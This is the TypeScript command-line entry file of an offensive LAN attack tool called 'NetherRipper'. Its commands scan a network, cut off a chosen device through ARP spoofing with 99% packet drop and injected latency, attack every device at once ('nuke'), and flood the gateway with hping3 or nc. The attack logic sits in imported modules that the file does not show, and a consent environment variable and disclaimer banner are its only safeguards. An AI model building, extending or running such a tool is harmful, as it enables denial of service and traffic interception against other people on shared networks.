import chalk from 'chalk';
import { 
  getActiveInterface, 
  getNetworkInfo, 
  scanNetwork, 
  isTargetOnline 
} from './core/scanner';
import { 
  killTarget, 
  stopAttack, 
  validateTarget,
  checkIpForwarding,
  enableIpForwarding,
  monitorTarget
} from './core/killer';
import {
  startGatewayFlood,
  stopGatewayFlood,
  checkFloodTools,
  monitorFlood
} from './core/flood';
import {
  loadState,
  addTarget,
  clearState,
  formatState,
} from './core/state';
import { 
  requireRoot, 
  checkDependencies,
  checkOptionalTools 
} from './core/exec';

/**
 * Show banner
 */
function showBanner(): void {
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║') + chalk.yellow.bold('  🔥 NETHERIPPER v2.1 - Network Destroyer  🔥  ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╠════════════════════════════════════════════════╣'));
  console.log(chalk.red.bold('║  ⚠️  WARNING: EXTREME NETWORK ATTACK TOOL      ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  🔒 Educational & Authorized Testing ONLY     ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  ⚖️  Unauthorized use is ILLEGAL              ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));
}

/**
 * Show help
 */
function showHelp(): void {
  console.log(chalk.cyan.bold('NetherRipper - Extreme Network Attack Tool\n'));
  console.log(chalk.white('Usage:'));
  console.log(chalk.gray('  sudo nr <command> [target]\n'));
  console.log(chalk.white('Commands:'));
  console.log(chalk.green('  scan             ') + chalk.gray('Scan network for devices'));
  console.log(chalk.green('  kill <IP>        ') + chalk.gray('Kill target bandwidth (EXTREME)'));
  console.log(chalk.red('  nuke             ') + chalk.gray('💀 KILL ALL DEVICES (NUCLEAR OPTION)'));
  console.log(chalk.red('  flood            ') + chalk.gray('🌊 FLOOD GATEWAY - KILLS ENTIRE NETWORK'));
  console.log(chalk.green('  stop             ') + chalk.gray('Stop all attacks'));
  console.log(chalk.green('  status           ') + chalk.gray('Show active attacks'));
  console.log(chalk.green('  help             ') + chalk.gray('Show this help\n'));
  console.log(chalk.white('Examples:'));
  console.log(chalk.gray('  sudo nr scan'));
  console.log(chalk.gray('  sudo nr kill 192.168.1.100'));
  console.log(chalk.red('  sudo nr nuke                    # KILL EVERYTHING!'));
  console.log(chalk.red('  sudo nr flood                   # FLOOD GATEWAY - TOTAL DESTRUCTION'));
  console.log(chalk.gray('  sudo nr stop\n'));
  console.log(chalk.dim('GitHub: https://github.com/yourusername/netheripper\n'));
}

/**
 * Check consent
 */
function checkConsent(): void {
  if (process.env.NETHER_CONSENT !== 'yes') {
    console.log(chalk.red('❌ Ethical consent required'));
    console.log(chalk.yellow('\nSet environment variable:'));
    console.log(chalk.white('  export NETHER_CONSENT=yes\n'));
    process.exit(1);
  }
}

/**
 * Command: scan
 */
async function cmdScan(): Promise<void> {
  console.log(chalk.cyan('🔍 Scanning network...\n'));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);

  console.log(chalk.gray(`Interface: ${iface}`));
  console.log(chalk.gray(`Network: ${networkInfo.networkAddress}/${networkInfo.subnet}`));
  console.log(chalk.gray(`Gateway: ${networkInfo.gateway}\n`));

  // Scan network
  const devices = await scanNetwork(networkInfo);

  if (devices.length === 0) {
    console.log(chalk.yellow('No devices found'));
    return;
  }

  // Display results
  console.log(chalk.cyan('Devices found:\n'));
  console.log(chalk.white('┌─────────────────┬───────────────────┬──────────────────────┐'));
  console.log(chalk.white('│ IP Address      │ MAC Address       │ Info                 │'));
  console.log(chalk.white('├─────────────────┼───────────────────┼──────────────────────┤'));

  for (const device of devices) {
    const ip = device.ip.padEnd(15);
    const mac = device.mac.padEnd(17);
    let info = device.vendor || 'Unknown';
    
    if (device.isGateway) {
      info = chalk.blue('[Gateway]');
    } else if (device.isOwn) {
      info = chalk.green('[You]');
    }

    console.log(`│ ${ip} │ ${mac} │ ${info.padEnd(20)} │`);
  }

  console.log(chalk.white('└─────────────────┴───────────────────┴──────────────────────┘\n'));
  console.log(chalk.green(`✓ Found ${devices.length} devices\n`));
}

/**
 * Command: kill
 */
async function cmdKill(targetIp: string): Promise<void> {
  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);

  // Validate target
  validateTarget(targetIp, networkInfo);

  // Check if target is online
  console.log(chalk.gray(`Checking if ${targetIp} is online...`));
  const isOnline = await isTargetOnline(targetIp);
  
  if (!isOnline) {
    console.log(chalk.yellow(`\n⚠️  Warning: Target ${targetIp} appears offline`));
    console.log(chalk.gray('Continuing anyway...\n'));
  }

  // Show warning
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║  ⚠️  EXTREME NETWORK ATTACK                    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold(`║  Target: ${targetIp.padEnd(39)}`) + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  This WILL destroy their connection!           ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Press Ctrl+C to abort (3s)...                 ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));

  // Wait 3 seconds
  await new Promise(resolve => setTimeout(resolve, 3000));

  // Enable IP forwarding
  console.log(chalk.gray('Enabling IP forwarding...'));
  const forwarding = await checkIpForwarding();
  if (!forwarding) {
    await enableIpForwarding();
  }

  // Apply attack
  console.log(chalk.red(`\n💀 KILLING ${targetIp}...\n`));

  const rules = await killTarget({
    targetIp,
    interface: iface,
    gateway: networkInfo.gateway,
  });

  // Save state
  addTarget({
    ip: targetIp,
    mac: 'Unknown',
    startTime: new Date().toISOString(),
    rules,
  });

  console.log(chalk.green('✓ ARP Spoofing active (MITM)'));
  console.log(chalk.green('✓ Bandwidth throttled (1KB/s)'));
  console.log(chalk.green('✓ Packet drop enabled (99%)'));
  console.log(chalk.green('✓ Latency injected (5000ms)'));

  console.log(chalk.red.bold(`\n💀 Target ${targetIp} is now DEAD\n`));
  console.log(chalk.yellow(`Run ${chalk.white('\'sudo nr stop\'')} to restore\n`));

  // Monitor target
  console.log(chalk.gray('Monitoring target (Ctrl+C to stop)...\n'));
  
  let iterations = 0;
  const interval = setInterval(async () => {
    iterations++;
    const status = await monitorTarget(targetIp);
    
    if (status.alive) {
      console.log(chalk.gray(`[${new Date().toISOString()}] Target alive - Latency: ${status.latency?.toFixed(0)}ms`));
    } else {
      console.log(chalk.red(`[${new Date().toISOString()}] Target DEAD - No response`));
    }

    // Stop after 10 checks
    if (iterations >= 10) {
      clearInterval(interval);
      console.log(chalk.yellow('\nMonitoring stopped. Attack still active.'));
      console.log(chalk.gray('Run \'sudo nr stop\' to cleanup\n'));
    }
  }, 5000);
}

/**
 * Command: nuke (KILL ALL DEVICES)
 */
async function cmdNuke(): Promise<void> {
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║  ☢️  NUCLEAR OPTION - KILL ALL DEVICES  ☢️     ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╠════════════════════════════════════════════════╣'));
  console.log(chalk.red.bold('║  This will DESTROY ALL network connections!    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Including YOUR connection!                    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Press Ctrl+C to abort (5s)...                 ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));

  // Wait 5 seconds
  await new Promise(resolve => setTimeout(resolve, 5000));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);

  console.log(chalk.cyan('\n🔍 Scanning for targets...\n'));

  // Scan network
  const devices = await scanNetwork(networkInfo);

  // Filter out own IP, but INCLUDE gateway
  const targets = devices.filter(d => !d.isOwn);

  if (targets.length === 0) {
    console.log(chalk.yellow('No targets found'));
    return;
  }

  console.log(chalk.red(`\n☢️  NUKING ${targets.length} TARGETS...\n`));

  // Enable IP forwarding
  const forwarding = await checkIpForwarding();
  if (!forwarding) {
    await enableIpForwarding();
  }

  // Attack each target
  let successCount = 0;
  for (const device of targets) {
    try {
      console.log(chalk.gray(`Attacking ${device.ip} (${device.mac})...`));
      
      const rules = await killTarget({
        targetIp: device.ip,
        interface: iface,
        gateway: networkInfo.gateway,
      });

      addTarget({
        ip: device.ip,
        mac: device.mac,
        startTime: new Date().toISOString(),
        rules,
      });

      successCount++;
      console.log(chalk.green(`  ✓ ${device.ip} KILLED`));
    } catch (error) {
      console.log(chalk.yellow(`  ⚠️  Failed to attack ${device.ip}: ${error}`));
    }
  }

  console.log(chalk.red.bold(`\n☢️  NUKE COMPLETE: ${successCount}/${targets.length} targets destroyed\n`));
  console.log(chalk.yellow(`Run ${chalk.white('\'sudo nr stop\'')} to restore all connections\n`));
}

/**
 * Command: flood (GATEWAY SATURATION)
 */
async function cmdFlood(): Promise<void> {
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║  🌊 GATEWAY FLOOD - TOTAL NETWORK KILL  🌊    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╠════════════════════════════════════════════════╣'));
  console.log(chalk.red.bold('║  This will SATURATE the gateway bandwidth!     ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  ALL devices will suffer (including yours!)    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  WiFi will become UNUSABLE for everyone!       ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Press Ctrl+C to abort (5s)...                 ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));

  // Wait 5 seconds
  await new Promise(resolve => setTimeout(resolve, 5000));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);
  const gatewayIp = networkInfo.gateway;

  console.log(chalk.cyan(`\n🎯 Target: ${gatewayIp} (Gateway)\n`));

  // Check flood tools
  const tools = await checkFloodTools();
  console.log(chalk.gray('Available tools:'));
  console.log(chalk.gray(`  hping3: ${tools.hping3 ? '✓' : '✗ (install for better performance)'}`));
  console.log(chalk.gray(`  curl: ${tools.curl ? '✓' : '✗'}`));
  console.log(chalk.gray(`  nc: ${tools.nc ? '✓' : '✗'}`));
  console.log('');

  if (!tools.hping3) {
    console.log(chalk.yellow('⚠️  For maximum effectiveness, install hping3:'));
    console.log(chalk.gray('   sudo apt install hping3\n'));
  }

  // Choose intensity
  const intensity = process.env.NETHER_FLOOD_INTENSITY || 'high';
  console.log(chalk.red(`🌊 Starting GATEWAY FLOOD at ${intensity.toUpperCase()} intensity...\n`));

  // Enable IP forwarding
  const forwarding = await checkIpForwarding();
  if (!forwarding) {
    await enableIpForwarding();
  }

  // Start flood
  await startGatewayFlood({
    targetIp: gatewayIp,
    interface: iface,
    intensity: intensity as any,
  });

  console.log(chalk.red.bold('\n🌊 GATEWAY FLOOD ACTIVE\n'));
  console.log(chalk.yellow('The entire network should now be EXTREMELY slow!'));
  console.log(chalk.yellow('All devices (phones, laptops, etc.) will suffer.\n'));
  console.log(chalk.gray('Monitoring gateway response (Ctrl+C to stop)...\n'));

  // Monitor effectiveness
  let iterations = 0;
  const monitorInterval = setInterval(async () => {
    iterations++;
    
    const stats = await monitorFlood(gatewayIp);
    
    if (stats.responseTime > 1000) {
      console.log(chalk.red(`[${new Date().toISOString()}] Gateway OVERLOADED - Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
    } else if (stats.responseTime > 500) {
      console.log(chalk.yellow(`[${new Date().toISOString()}] Gateway STRESSED - Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
    } else {
      console.log(chalk.gray(`[${new Date().toISOString()}] Response: ${stats.responseTime}ms (CPU: ${stats.cpuLoad.toFixed(2)})`));
    }

    // Stop after 20 checks
    if (iterations >= 20) {
      clearInterval(monitorInterval);
      console.log(chalk.yellow('\nMonitoring stopped. Flood still active.'));
      console.log(chalk.gray('Run \'sudo nr stop\' to cleanup\n'));
    }
  }, 3000);

  // Save to global so we can stop it later
  (global as any).__floodInterval = monitorInterval;
}

/**
 * Command: stop
 */
async function cmdStop(): Promise<void> {
  console.log(chalk.cyan('\n🛑 Stopping all attacks...\n'));

  // Stop flood if active
  try {
    await stopGatewayFlood();
    console.log(chalk.green('✓ Gateway flood stopped'));
  } catch {
    // Ignore if not running
  }

  // Clear monitoring interval
  if ((global as any).__floodInterval) {
    clearInterval((global as any).__floodInterval);
    (global as any).__floodInterval = null;
  }

  const state = loadState();
  
  if (!state || state.targets.length === 0) {
    console.log(chalk.yellow('No active target attacks to stop\n'));
    return;
  }

  const iface = await getActiveInterface();

  // Stop all attacks
  for (const target of state.targets) {
    console.log(chalk.gray(`Cleaning up rules for ${target.ip}...`));
    await stopAttack(iface, target.rules);
  }

  // Clear state
  clearState();

  console.log(chalk.green('\n✓ All attacks stopped'));
  console.log(chalk.green('✓ Network rules cleaned up\n'));
}

/**
 * Command: status
 */
async function cmdStatus(): Promise<void> {
  console.log(chalk.cyan('\n📊 NetherRipper Status\n'));
  
  const state = loadState();
  
  if (!state || state.targets.length === 0) {
    console.log(chalk.gray('No active attacks\n'));
    return;
  }

  console.log(chalk.white(formatState()));
}

/**
 * Main CLI
 */
async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const command = args[0] || 'help';

  // Show help without checks
  if (command === 'help' || command === '--help' || command === '-h') {
    showHelp();
    return;
  }

  // Show banner
  showBanner();

  // Check consent
  checkConsent();

  // Check root for dangerous commands
  if (['kill', 'stop', 'scan', 'nuke', 'flood'].includes(command)) {
    requireRoot();
  }

  // Check dependencies
  const missing = await checkDependencies();
  if (missing.length > 0) {
    console.log(chalk.red('❌ Missing required tools:'));
    for (const tool of missing) {
      console.log(chalk.gray(`   - ${tool}`));
    }
    console.log(chalk.yellow('\nInstall with: sudo apt install iproute2 iptables net-tools iputils-arping\n'));
    process.exit(1);
  }

  // Check optional tools
  const optional = await checkOptionalTools();
  if (!optional.arpScan && !optional.nmap) {
    console.log(chalk.yellow('⚠️  Tip: Install arp-scan or nmap for better scanning'));
    console.log(chalk.gray('   sudo apt install arp-scan\n'));
  }

  // Route commands
  try {
    switch (command) {
      case 'scan':
        await cmdScan();
        break;

      case 'kill': {
        const targetIp = args[1];
        if (!targetIp) {
          console.log(chalk.red('❌ Target IP required'));
          console.log(chalk.gray('   Usage: sudo nr kill <IP>\n'));
          process.exit(1);
        }
        await cmdKill(targetIp);
        break;
      }

      case 'nuke':
        await cmdNuke();
        break;

      case 'flood':
        await cmdFlood();
        break;

      case 'stop':
        await cmdStop();
        break;

      case 'status':
        await cmdStatus();
        break;

      default:
        console.log(chalk.red(`❌ Unknown command: ${command}`));
        console.log(chalk.gray('   Run "nr help" for usage\n'));
        process.exit(1);
    }
  } catch (error) {
    console.error(chalk.red('\n❌ Error:'), error instanceof Error ? error.message : error);
    process.exit(1);
  }
}

// Handle Ctrl+C
process.on('SIGINT', async () => {
  console.log(chalk.yellow('\n\n⚠️  Interrupted by user'));
  console.log(chalk.white('   Run "sudo nr stop" to cleanup network rules\n'));
  process.exit(130);
});

// Run
main().catch(error => {
  console.error(chalk.red('Fatal error:'), error);
  process.exit(1);
});